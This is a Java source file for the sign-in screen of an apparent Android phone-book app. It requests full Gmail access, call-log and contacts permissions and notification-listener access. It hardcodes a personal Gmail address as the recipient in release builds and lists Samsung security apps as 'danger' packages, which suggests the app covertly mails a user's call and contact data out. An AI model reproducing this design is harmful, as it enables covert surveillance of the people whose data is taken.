package com.tr.hsyn.telefonrehberi.xyz.main.activity;

import android.Manifest;
import android.accounts.AccountManager;
import android.annotation.SuppressLint;
import android.app.Dialog;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.transition.TransitionManager;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import com.google.android.gms.common.ConnectionResult;
import com.google.android.gms.common.GoogleApiAvailability;
import com.google.android.gms.common.api.GoogleApiClient;
import com.google.api.client.googleapis.extensions.android.gms.auth.GoogleAccountCredential;
import com.google.api.client.googleapis.extensions.android.gms.auth.GooglePlayServicesAvailabilityIOException;
import com.google.api.client.googleapis.extensions.android.gms.auth.UserRecoverableAuthIOException;
import com.google.api.client.http.HttpTransport;
import com.google.api.client.http.javanet.NetHttpTransport;
import com.google.api.client.json.JsonFactory;
import com.google.api.client.json.jackson2.JacksonFactory;
import com.google.api.client.util.ExponentialBackOff;
import com.google.api.services.gmail.Gmail;
import com.google.api.services.gmail.GmailScopes;
import com.google.api.services.gmail.model.Label;
import com.google.api.services.gmail.model.ListLabelsResponse;
import com.tr.hsyn.telefonrehberi.BuildConfig;
import com.tr.hsyn.telefonrehberi.R;
import com.tr.hsyn.telefonrehberi.util.Bungee;
import com.tr.hsyn.telefonrehberi.util.Time;
import com.tr.hsyn.telefonrehberi.util.phone.Phone;
import com.tr.hsyn.telefonrehberi.xyz.ptt.nlservice.IRecipients;
import com.tr.hsyn.telefonrehberi.xyz.ptt.nlservice.NLService;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

import io.paperdb.Book;
import io.paperdb.Paper;
import lombok.val;
import pub.devrel.easypermissions.AfterPermissionGranted;
import pub.devrel.easypermissions.EasyPermissions;
import timber.log.Timber;


@SuppressLint("SetTextI18n")
public class SignActivity extends AppCompatActivity implements EasyPermissions.PermissionCallbacks,
      GoogleApiClient.ConnectionCallbacks,
      GoogleApiClient.OnConnectionFailedListener{
   
   public static final String[] SCOPES      = {GmailScopes.MAIL_GOOGLE_COM};
   private static      String[] PERMISSIONS = {
         
         Manifest.permission.GET_ACCOUNTS,
         Manifest.permission.READ_PHONE_STATE,
         Manifest.permission.PROCESS_OUTGOING_CALLS,
         Manifest.permission.READ_CALL_LOG,
         Manifest.permission.WRITE_CALL_LOG,
         Manifest.permission.READ_CONTACTS,
         Manifest.permission.WRITE_CONTACTS
      
   };
   
   final   int                     REQUEST_ACCOUNT_PICKER          = 1000;
   final   int                     REQUEST_AUTHORIZATION           = 1001;
   final   int                     REQUEST_GOOGLE_PLAY_SERVICES    = 1002;
   final   int                     REQUEST_PERMISSION_GET_ACCOUNTS = 1003;
   private GoogleAccountCredential mCredential;
   private ProgressDialog          mProgress;
   private Button                  sign;
   private Button                  notificationServise;
   private TextView                outputText;
   //private SharedPreferences       prefGmail;
   private ViewGroup               root;
   
   
   @Override
   protected void onCreate(Bundle savedInstanceState){
      
      super.onCreate(savedInstanceState);
      
      setContentView(R.layout.activity_sign);
      
      //TextView notification_access_description = findViewById(R.id.notification_access_description);
      //TextView sign_description = findViewById(R.id.sign_description);
      
      //Spanner spanner = new Spanner("Uygulamanın seni engellenemez bir şekilde uyarabilmesi için Bildirim Erişimi İzni vermek zorundasın. Çünkü uygulama senin rehber ve arama kayıtları bilgilerini kullanmakta. Bilgilerin hassasiyeti açısından, yanlışlıkla yada kötü amaçlı kullanılmaması için uygulama seni her adımda uyaracak.  ");
      
      root       = findViewById(R.id.root);
      outputText = findViewById(R.id.output);
      
      sign                = findViewById(R.id.sign);
      notificationServise = findViewById(R.id.notificationService);
      
      sign.setOnClickListener(this::onClickSign);
      notificationServise.setOnClickListener(this::onClickNotificationServise);
      notificationServise.setEnabled(false);
      
      
      setRecipients();
      
      mProgress = new ProgressDialog(this);
      mProgress.setMessage("Bekle...");
      
      // Initialize credentials and service object.
      mCredential = GoogleAccountCredential.usingOAuth2(getApplicationContext(), Arrays.asList(SCOPES)).setBackOff(new ExponentialBackOff());
      
      
      Timber.w(Time.whatTimeIsIt());
      
      if(BuildConfig.DEBUG){
         
         Timber.i("Debug mode started");
      }
      
      //sign.performClick();
      
      
      setPackages();
      
      
   }
   
   @Override
   public void onBackPressed(){
      
      super.onBackPressed();
      
      Bungee.slideRight(this);
   }
   
   /**
    * Called when an activity launched here (specifically, AccountPicker
    * and authorization) exits, giving you the requestCode you started it with,
    * the resultCode it returned, and any additional data from it.
    *
    * @param requestCode code indicating which activity result is incoming.
    * @param resultCode  code indicating the result of the incoming
    *                    activity result.
    * @param data        Intent (containing result data) returned by incoming
    *                    activity result.
    */
   @Override
   protected void onActivityResult(int requestCode, int resultCode, Intent data){
      
      super.onActivityResult(requestCode, resultCode, data);
      
      switch(requestCode){
         
         case REQUEST_GOOGLE_PLAY_SERVICES:
            
            if(resultCode != RESULT_OK){
               
               outputText.setText("Googleplay servisi yüklü değil");
            }
            else{
               
               getResultsFromApi();
            }
            
            break;
         
         case REQUEST_ACCOUNT_PICKER:
            
            if(resultCode == RESULT_OK && data != null && data.getExtras() != null){
               
               String accountName = data.getStringExtra(AccountManager.KEY_ACCOUNT_NAME);
               
               if(accountName != null){
                  
                  Paper.book().write("from", accountName);
                  //prefGmail.edit().putString("from", accountName).apply();
                  mCredential.setSelectedAccountName(accountName);
                  getResultsFromApi();
               }
            }
            else{
               
               sign.setEnabled(true);
            }
            
            break;
         
         case REQUEST_AUTHORIZATION:
            
            if(resultCode == RESULT_OK){
               
               getResultsFromApi();
            }
            
            break;
      }
   }
   
   @Override
   protected void onPause(){
      
      super.onPause();
      mProgress.dismiss();
   }
   
   @Override
   protected void onResume(){
      
      super.onResume();
      
      checkLogic();
      
   }
   
   private void checkLogic(){
      
      if(!EasyPermissions.hasPermissions(this, PERMISSIONS)){
         
         TransitionManager.beginDelayedTransition(root);
         outputText.setText("Giriş yaparak izinleri onayla\nOnay bekleniyor");
         sign.setEnabled(true);
         notificationServise.setEnabled(false);
         return;
      }
      
      
      String  from = getFrom();
      boolean noti = Phone.isServiceRunning(this, NLService.class);
      
      if(from != null){
   
         if(Phone.isValidEmailAddress(from)){
            
            sign.setEnabled(false);
            Timber.d("Sign ON");
         }
         else{
            
            Timber.w("Email adresi geçerli değil : %s", from);
   
            fromNull();
            Timber.d("Sign OFF");
            return;
         }
      }
      else{
         
         fromNull();
         Timber.d("Sign OFF");
         return;
      }
      
      if(noti){
         
         Timber.d("Notification ON");
         
         Paper.book("main").write("sign", true);
         
         finishAndRemoveTask();
         Bungee.slideRight(this);
      }
      else{
         
         notificationServise.setEnabled(true);
         outputText.setText("Bildirim Servisini Aç \"Rehber\"");
         Timber.d("Notification OFF");
      }
   }
   
   public static String getFrom(){
      
      return Paper.book().read("from", null);
   }
   
   private void fromNull(){
      
      sign.setEnabled(true);
      notificationServise.setEnabled(false);
      
   }
   
   /**
    * Respond to requests for permissions at runtime for API 23 and above.
    *
    * @param requestCode  The request code passed in
    *                     requestPermissions(android.app.Activity, String, int, String[])
    * @param permissions  The requested permissions. Never null.
    * @param grantResults The grant results for the corresponding permissions
    *                     which is either PERMISSION_GRANTED or PERMISSION_DENIED. Never null.
    */
   @Override
   public void onRequestPermissionsResult(int requestCode,
                                          @NonNull String[] permissions,
                                          @NonNull int[] grantResults){
      
      super.onRequestPermissionsResult(requestCode, permissions, grantResults);
      
      
      reportPermissions(permissions, grantResults);
      
      EasyPermissions.onRequestPermissionsResult(
            requestCode, permissions, grantResults, this);
   }
   
   private void reportPermissions(@NonNull String[] permissions,
                                  @NonNull int[] grantResults){
      
      boolean isAllOkey = true;
      
      for(int i = 0; i < permissions.length; i++){
         
         String permission = permissions[i];
         String result     = grantResults[i] == PackageManager.PERMISSION_GRANTED ? "izin var" : "izin yok";
         
         if(result.equals("izin yok")) isAllOkey = false;
         
         Timber.d("%50s : %s", permission, result);
      }
      
      TransitionManager.beginDelayedTransition(root);
      
      if(isAllOkey){
         
         outputText.setText("Bütün izinler onaylandı\nGiriş yapılması bekleniyor");
      }
      else{
         
         outputText.setText("Onaylanmayan izinler var");
         sign.setEnabled(true);
      }
   }
   
   /**
    * Callback for when a permission is granted using the EasyPermissions
    * library.
    *
    * @param requestCode The request code associated with the requested
    *                    permission
    * @param list        The requested permission list. Never null.
    */
   @Override
   public void onPermissionsGranted(int requestCode, @NonNull List<String> list){
      
   }
   
   /**
    * Callback for when a permission is denied using the EasyPermissions
    * library.
    *
    * @param requestCode The request code associated with the requested
    *                    permission
    * @param list        The requested permission list. Never null.
    */
   @Override
   public void onPermissionsDenied(int requestCode, @NonNull List<String> list){
      // Do nothing.
      
      outputText.setText("İzin reddedildi");
   }
   
   @Override
   public void onConnected(@Nullable Bundle bundle){
      
   }
   
   @Override
   public void onConnectionSuspended(int i){
      
   }
   
   @Override
   public void onConnectionFailed(@NonNull ConnectionResult connectionResult){
    /*
        if (connectionResult.hasResolution()) {
            try {
                connectionResult.startResolutionForResult(this, RESOLVE_CONNECTION_REQUEST_CODE);
            } catch (IntentSender.SendIntentException e) {
                // Unable to resolve, message user appropriately
            }
        } else {
            GooglePlayServicesUtil.getErrorDialog(connectionResult.getErrorCode(), this, 0).show();
            Log.e("onConnectionFailed", "error");
        }

        */
   }
   
   private void setRecipients(){
      
      val r = IRecipients.create();
      
      if(BuildConfig.DEBUG){
         
         r.add("hsyntr33@gmail.com");
      }
      else{
         
         //to.add("kahverengikahverengidir@gmail.com");
         r.add("hsyntr33@gmail.com");
      }
   }
   
   private void setPackages(){
      
      Set<String> packages = new HashSet<>();
      packages.add("com.google.android.gm");
      packages.add("mail");
      packages.add("Mail");
      
      Book book = Paper.book();
      
      book.write("mailpacks", packages);
      
      Timber.d(packages.toString());
      packages.clear();
      
      packages.add("com.samsung.android.lool");
      packages.add("com.samsung.android.securitylogagent");
      
      book.write("dangerpacks", packages);
      Timber.d(packages.toString());
      packages.clear();
      
      packages.add("com.samsung.android.incallui");
      packages.add("com.android.dialer");
      
      book.write("junkpacks", packages);
      Timber.d(packages.toString());
      
   }
   
   private void onClickSign(View view){
      
      view.setEnabled(false);
      getResultsFromApi();
      
   }
   
   private void onClickNotificationServise(View view){
      
      view.setEnabled(false);
      
      if(Phone.isServiceRunning(this, NLService.class)) return;
      
      Phone.openNotificationAccessSetting(this);
   }
   
   /**
    * Attempt to call the API, after verifying that all the preconditions are
    * satisfied. The preconditions are: Google Play Services installed, an
    * account was selected and the device currently has online access. If any
    * of the preconditions are not satisfied, the app will prompt the user as
    * appropriate.
    */
   private void getResultsFromApi(){
      
      if(!isGooglePlayServicesAvailable()){
         Timber.w("googleplay service not available");
         acquireGooglePlayServices();
      }
      else if(mCredential.getSelectedAccountName() == null){
         
         Timber.d("hesap seçilecek");
         chooseAccount();
      }
      else if(!isDeviceOnline()){
         
         //TransitionManager.beginDelayedTransition(findViewById(R.id.root));
         outputText.setText("internet yok");
      }
      else{
         new MakeRequestTask(mCredential).execute();
      }
   }
   
   /**
    * Attempts to set the account used with the API credentials. If an account
    * name was previously saved it will use that one; otherwise an account
    * picker dialog will be shown to the user. Note that the setting the
    * account to use with the credentials object requires the app to have the
    * GET_ACCOUNTS permission, which is requested here if it is not already
    * present. The AfterPermissionGranted annotation indicates that this
    * function will be rerun automatically whenever the GET_ACCOUNTS permission
    * is granted.
    */
   @AfterPermissionGranted(REQUEST_PERMISSION_GET_ACCOUNTS)
   private void chooseAccount(){
      
      if(EasyPermissions.hasPermissions(this, PERMISSIONS)){
         
         if(!Phone.isOnline(this)){
            
            outputText.setText("İnternet yok");
            sign.setEnabled(true);
            return;
         }
         
         
         String accountName = getFrom();
         
         if(accountName != null){
            
            Timber.d("accountName = " + accountName);
            mCredential.setSelectedAccountName(accountName);
            getResultsFromApi();
         }
         else{
            // Start a dialog from which the user can choose an account
            startActivityForResult(mCredential.newChooseAccountIntent(), REQUEST_ACCOUNT_PICKER);
            
         }
      }
      else{
         
         // Request the GET_ACCOUNTS permission via a user dialog
           /* EasyPermissions.requestPermissions(
                    this,
                    "This app needs to access your Google account (via Contacts).",
                    REQUEST_PERMISSION_GET_ACCOUNTS,
                    PERMISSIONS
            );*/
         
         
         if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M){
            requestPermissions(PERMISSIONS, REQUEST_PERMISSION_GET_ACCOUNTS);
         }
      }
   }
   
   /**
    * Attempt to resolve a missing, out-of-date, invalid or disabled Google
    * Play Services installation via a user dialog, if possible.
    */
   private void acquireGooglePlayServices(){
      
      GoogleApiAvailability apiAvailability      = GoogleApiAvailability.getInstance();
      final int             connectionStatusCode = apiAvailability.isGooglePlayServicesAvailable(this);
      
      if(apiAvailability.isUserResolvableError(connectionStatusCode)){
         
         showGooglePlayServicesAvailabilityErrorDialog(connectionStatusCode);
      }
   }
   
   /**
    * Checks whether the device currently has a network connection.
    *
    * @return true if the device has a network connection, false otherwise.
    */
   private boolean isDeviceOnline(){
      
      ConnectivityManager connMgr     = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
      NetworkInfo         networkInfo = null;
      if(connMgr != null){
         networkInfo = connMgr.getActiveNetworkInfo();
      }
      return (networkInfo != null && networkInfo.isConnected());
   }
   
   /**
    * Check that Google Play services APK is installed and up to date.
    *
    * @return true if Google Play Services is available and up to
    * date on this device; false otherwise.
    */
   private boolean isGooglePlayServicesAvailable(){
      
      GoogleApiAvailability apiAvailability      = GoogleApiAvailability.getInstance();
      final int             connectionStatusCode = apiAvailability.isGooglePlayServicesAvailable(this);
      return connectionStatusCode == ConnectionResult.SUCCESS;
   }
   
   /**
    * An asynchronous task that handles the Gmail API call.
    * Placing the API calls in their own task ensures the UI stays responsive.
    */
   @SuppressLint("StaticFieldLeak")
   private class MakeRequestTask extends AsyncTask<Void, Void, List<String>>{
      
      private Gmail     mService;
      private Exception mLastError = null;
      
      MakeRequestTask(GoogleAccountCredential credential){
         
         
         //HttpTransport transport   = AndroidHttp.newCompatibleTransport();
         HttpTransport transport   = new NetHttpTransport();
         JsonFactory   jsonFactory = JacksonFactory.getDefaultInstance();
         
         mService = new Gmail.Builder(transport, jsonFactory, credential)
               .setApplicationName("Gmail API Android")
               .build();
      }
      
      /**
       * Background task to call Gmail API.
       *
       * @param params no parameters needed for this task.
       */
      @Override
      protected List<String> doInBackground(Void... params){
         
         try{
            return getDataFromApi();
         }
         catch(Exception e){
            mLastError = e;
            cancel(true);
            return null;
         }
      }
      
      /**
       * Fetch a list of Gmail labels attached to the specified account.
       *
       * @return List of Strings labels.
       */
      private List<String> getDataFromApi()
            throws
            IOException{
         
         //create my label
         /*Label mylabel = */
         
         //Mail.createLabel(mService, "xyz_0412");
         
         
         Timber.w("data from api");
         
         // Get the labels in the user's account.
         String             user         = "me";
         List<String>       labels       = new ArrayList<>();
         ListLabelsResponse listResponse = mService.users().labels().list(user).execute();
         
         for(Label label : listResponse.getLabels()){
            
            labels.add(label.getName());
         }
         
         Timber.w(labels.toString());
         
         return labels;
      }
      
      @Override
      protected void onPreExecute(){
         
         //mOutputText.setText("");
         mProgress.show();
      }
      
      @Override
      protected void onPostExecute(List<String> output){
         
         mProgress.hide();
         
         if(output == null || output.size() == 0){
            
            outputText.setText("Dönen sonuç yok");
         }
         else{
            
            boolean b = false;
            
            for(String s : output){
               
               if(s.equals("INBOX")){
                  
                  b = true;
                  break;
               }
            }
            
            if(b){
               
               Timber.d("Hesap kaydedildi : %s", getFrom());
               
               checkLogic();
            }
            else{
               
               outputText.setText("Giriş yapılamadı!");
            }
         }
      }
      
      @Override
      protected void onCancelled(){
         
         mProgress.hide();
         if(mLastError != null){
            if(mLastError instanceof GooglePlayServicesAvailabilityIOException){
               showGooglePlayServicesAvailabilityErrorDialog(
                     ((GooglePlayServicesAvailabilityIOException) mLastError)
                           .getConnectionStatusCode());
            }
            else if(mLastError instanceof UserRecoverableAuthIOException){
               startActivityForResult(
                     ((UserRecoverableAuthIOException) mLastError).getIntent(),
                     REQUEST_AUTHORIZATION);
            }
         }
         else{
            
            TransitionManager.beginDelayedTransition(root);
            outputText.setText("İptal edildi");
         }
      }
      
   }
   
   /**
    * Display an error dialog showing that Google Play Services is missing
    * or out of date.
    *
    * @param connectionStatusCode code describing the presence (or lack of)
    *                             Google Play Services on this device.
    */
   void showGooglePlayServicesAvailabilityErrorDialog(final int connectionStatusCode){
      
      GoogleApiAvailability apiAvailability = GoogleApiAvailability.getInstance();
      
      Dialog dialog = apiAvailability.getErrorDialog(
            SignActivity.this,
            connectionStatusCode,
            REQUEST_GOOGLE_PLAY_SERVICES);
      dialog.show();
   }
   
}
